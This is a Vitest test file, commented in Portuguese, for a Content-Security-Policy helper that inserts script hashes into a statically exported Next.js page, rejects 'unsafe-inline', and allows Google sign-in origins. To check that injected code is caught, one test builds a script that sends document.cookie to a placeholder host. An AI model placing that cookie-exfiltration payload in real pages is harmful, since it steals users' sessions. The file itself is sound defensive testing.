import { describe, expect, it } from "vitest";

import {
  applyContentSecurityPolicy,
  contentSecurityPolicy,
  contentSecurityPolicyProblems,
  inlineScripts,
  scriptHash,
} from "./csp.mjs";

const page = [
  "<!DOCTYPE html><html><head><meta charSet=\"utf-8\"/>",
  "<script>(function(){document.documentElement.classList.toggle('dark',true)})();</script>",
  "<script src=\"/_next/static/chunks/app.js\" async></script>",
  "</head><body><script>self.__next_f.push([1,\"payload\"])</script>",
  "<script type=\"application/json\">{\"dado\":true}</script></body></html>",
].join("");
const options = { projectId: "atendo-teste", authDomain: "atendo-teste.firebaseapp.com" };

describe("CSP do export estatico", () => {
  it("considera so scripts inline executaveis", () => {
    expect(inlineScripts(page)).toHaveLength(2);
  });

  it("pagina sem politica e reprovada", () => {
    expect(contentSecurityPolicyProblems(page)).toEqual(["sem Content-Security-Policy"]);
  });

  it("grava a politica antes dos scripts, com o hash de cada script inline", () => {
    const published = applyContentSecurityPolicy(page, options);

    expect(contentSecurityPolicyProblems(published)).toEqual([]);
    for (const content of inlineScripts(page)) expect(published).toContain(scriptHash(content));
    expect(published.indexOf("Content-Security-Policy")).toBeLessThan(published.indexOf("<script"));
    // Reaplicar nao duplica a politica.
    expect(applyContentSecurityPolicy(published, options).match(/Content-Security-Policy/g)).toHaveLength(1);
  });

  it("script injetado depois da publicacao nao tem hash e e apontado", () => {
    const published = applyContentSecurityPolicy(page, options);
    const injected = published.replace("</body>", "<script>fetch('https://exemplo.invalido/?c='+document.cookie)</script></body>");

    expect(contentSecurityPolicyProblems(injected)).toContain("script inline sem hash na CSP");
  });

  it("recusa politica que libera execucao inline", () => {
    const loose = page.replace("<head>", "<head><meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self' 'unsafe-inline'\"/>");
    expect(contentSecurityPolicyProblems(loose)).toContain("script-src permite execucao inline");
  });

  /**
   * Em 21/09/2026 o botao "Entrar com o Google" parou por falta desta origem.
   * O erro nao aparece na tela: o navegador recusa o script, o SDK rejeita e a
   * pagina mostra "Nao foi possivel entrar com o Google" — que parece problema
   * do Google, e nao da nossa politica.
   */
  it("libera o gapi, sem o qual o login com Google nao abre", () => {
    const policy = contentSecurityPolicy({ scriptHashes: [], ...options });
    const directive = (name) => policy.split("; ").find((part) => part.startsWith(`${name} `));

    expect(directive("script-src"), "o Firebase Auth carrega apis.google.com/js/api.js").toContain(
      "https://apis.google.com",
    );
    expect(directive("frame-src"), "o gapi monta um iframe de relay em apis.google.com").toContain(
      "https://apis.google.com",
    );
  });

  it("restringe conexoes ao Firebase do projeto, sem curinga", () => {
    const policy = contentSecurityPolicy({ scriptHashes: [], ...options });
    const connect = policy.split("; ").find((part) => part.startsWith("connect-src"));

    expect(connect).toContain("https://southamerica-east1-atendo-teste.cloudfunctions.net");
    expect(connect).not.toMatch(/\*|stripe/);
    expect(policy).toContain("object-src 'none'");
  });
});
